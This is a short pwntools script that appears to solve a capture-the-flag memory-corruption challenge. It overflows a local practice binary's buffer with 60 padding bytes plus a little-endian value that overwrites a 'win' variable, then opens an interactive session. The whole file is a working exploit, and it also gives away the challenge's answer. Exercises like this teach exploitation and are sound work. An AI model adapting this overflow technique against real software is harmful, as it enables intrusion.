from pwn import *

payload = b'A' * 60                # Padding to get to the "win" variable
payload += b'\x23\xac\x14\x4a'     # The value to overwrite the "win" variable, in little endian

p = process('/challenge/babymem_level2.0')

print(p.recvuntil('Payload size: ').decode()) # Read the program output until it prompts for the payload size
p.sendline(str(len(payload))) # Send the size of the payload
print(p.recvline().decode())  # Read the next line of the program output
p.sendline(payload) # Send the payload

p.interactive() # Switch to interactive mode so you can communicate with the process

